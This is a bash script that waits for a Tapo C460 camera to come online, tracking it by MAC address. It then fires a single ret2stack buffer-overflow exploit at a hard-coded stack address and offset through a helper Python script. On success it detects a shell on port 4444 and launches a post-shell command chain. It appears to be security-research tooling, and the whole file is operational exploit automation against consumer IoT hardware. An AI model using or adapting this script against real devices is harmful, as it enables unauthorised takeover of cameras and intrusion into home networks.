#!/bin/bash
# One-shot auto-fire watcher for the C460 ret2stack at the hang-hit address.
#
# The address 0xbef8b000 was found by the hang oracle (docs/exploit/tapo.md, 2026-10-28 23:0x): the
# payload's pc landed in the sled and the worker spun to its own timeout. The unit dozes between PIR
# events and re-appears at a new DHCP address, so the watcher follows the MAC, never an IP, and
# fires exactly once per boot. /tmp versions of this script died with the host; this one is durable
# and supervised by launchd (deliverables/launchd/com.jeffreyemanuel.c460-fire.plist).
#
# Presence is ARP-resolved-by-MAC **and** ICMP (standing rule 1): a sleeping unit keeps an ARP entry
# while serving nothing, and firing at it only hits a dead listener.
#
#   c460_fire.sh                 # wait for the unit, fire once, then run the post-shell chain
#   FORCE=1 c460_fire.sh         # ignore a previous 'fired' state (a fresh boot)
#   MAC=... ADDR=... c460_fire.sh
#
# Exit: 0 shell obtained (chain ran), 1 fired without a shell (DECODE-BUFFER zone -> sweep),
#       3 already fired this boot, 4 unit never appeared (with WATCH_DEADLINE set).
set -u
HERE="$(cd "$(dirname "$0")" && pwd)"
MAC="${MAC:-50:3d:d1:e3:e2:07}"
ADDR="${ADDR:-0xbef8b000}"
OFFSET="${OFFSET:-1060}"
LOG="${LOG:-/tmp/c460_fire.log}"
STATE="${STATE:-/tmp/c460_fire.state}"
POLL="${POLL:-5}"
GUARD_GAP="${GUARD_GAP:-3}"
WATCH_DEADLINE="${WATCH_DEADLINE:-0}"          # minutes of absence before giving up; 0 = forever
ARP_CMD="${ARP_CMD:-sudo -n /usr/sbin/arp -an}"
PY="${PY:-/opt/homebrew/bin/python3}"
PING="${PING:-ping}"
GUARD="${GUARD:-$HERE/tapo_connectap_sc.py}"
POSTSHELL="${POSTSHELL:-$HERE/c460_postshell.sh}"

log() {
  local line
  line="$(date '+%Y-%m-%d %H:%M:%S') $*"
  printf '%s\n' "$line" >> "$LOG"
  [ -t 1 ] && printf '%s\n' "$line"      # launchd already redirects stdout to $LOG
}

norm_mac() { echo "$1" | tr A-F a-f | awk -F: '{ for (i = 1; i <= NF; i++) $i = $i + 0; print }' OFS=:; }

# MAC -> IP from the census form; a bare `arp -n <ip>` lies from a subprocess.
resolve_ip() {
  $ARP_CMD 2>/dev/null | awk -v m="$(norm_mac "$MAC")" '
    /\(incomplete\)/ { next }
    { gsub(/[()]/, "", $2); mac = $4; n = split(mac, o, ":"); out = ""
      for (i = 1; i <= n; i++) out = out (i > 1 ? ":" : "") (o[i] + 0)
      if (out == m) { print $2; exit } }'
}

present() {
  local ip
  ip="$(resolve_ip)"
  [ -n "$ip" ] || return 1
  "$PING" -c 1 -t 1 "$ip" >/dev/null 2>&1
}

if [ -r "$STATE" ] && [ "${FORCE:-0}" != 1 ]; then
  log "state: $(cat "$STATE") — already fired, not re-firing (FORCE=1 to override)"
  exit 3
fi

log "watching for $MAC (fire $ADDR offset $OFFSET when ARP+ICMP present)"
deadline=0
if [ "$WATCH_DEADLINE" != 0 ]; then
  deadline=$(( $(date +%s) + $(awk -v m="$WATCH_DEADLINE" 'BEGIN{printf "%d", m*60}') ))
fi
last=""
while :; do
  if present; then
    [ "$last" = up ] || { log "PRESENT"; last=up; }
    break
  fi
  if [ "$last" != down ]; then log "absent (ARP or ICMP)"; last=down; fi
  if [ "$deadline" != 0 ] && [ "$(date +%s)" -ge "$deadline" ]; then
    log "still absent after ${WATCH_DEADLINE} min — not fired"
    exit 4
  fi
  sleep "$POLL"
done

ip="$(resolve_ip)"
[ -n "$ip" ] || { log "FATAL: present but the MAC resolved to no address"; exit 4; }
log "unit $ip — gap ${GUARD_GAP}s, then one shot"
sleep "$GUARD_GAP"

# state before the shot: a crash mid-fire must not produce a second payload
echo "fired $ip $(date '+%Y-%m-%d %H:%M:%S')" > "$STATE"

out="$( "$PY" "$GUARD" guard --host "$ip" --mac "$MAC" --addr "$ADDR" --offset "$OFFSET" \
        --count 1 --sledfill --padpc 1 --pcround 0x1000 \
        --guard-deadline 0 --guard-gap "$GUARD_GAP" 2>&1 )"
printf '%s\n' "$out" >> "$LOG"
[ -t 1 ] && printf '%s\n' "$out"

case "$out" in
  *"SHELL on"*)
    log "SHELL on $ip:4444 — running the post-shell chain"
    echo "shell $ip $(date '+%Y-%m-%d %H:%M:%S')" > "$STATE"
    "$POSTSHELL" "$ip" && exit 0
    log "post-shell chain FAILED (see /tmp/pane1/$ip)"
    exit 0
    ;;
esac

log "no shell at $ADDR — DECODE-BUFFER zone; re-derive with a hang sweep, do not re-fire blindly"
echo "noshell $ip $(date '+%Y-%m-%d %H:%M:%S')" > "$STATE"
exit 1
